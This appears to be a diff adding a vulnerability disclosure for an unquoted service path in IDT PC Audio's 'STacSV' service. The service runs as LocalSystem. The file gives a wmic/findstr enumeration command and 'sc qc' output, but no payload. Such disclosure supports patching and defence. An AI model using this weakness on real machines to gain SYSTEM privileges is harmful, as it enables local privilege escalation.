@@ -1,0 +1,31 @@
+# Exploit Title: IDT PC Audio 1.0.6425.0 - 'STacSV' Unquoted Service Path
+# Discovery by: Isabel Lopez
+# Software link: https://www.pconlife.com/download/otherfile/20566/098185e9b7c417cf7480bb9f839db652/
+# Discovery Date: 2020-11-07
+# Tested Version: 1.0.6425.0
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 x64 es
+
+
+# Step to discover Unquoted Service Path:
+
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" |findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+Audio service     STacSV     c:\Program Files\IDT\WDM\STacSV64.exe    Auto
+
+# Service info:
+
+c:\>sc qc STacSV
+[SC] QueryServiceConfig SUCCES
+
+SERVICE_NAME: STacSV
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : c:\Program Files\IDT\WDM\STacSV64.exe
+        LOAD_ORDER_GROUP   : AudioGroup
+        TAG                : 0
+        DISPLAY_NAME       : Audio Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
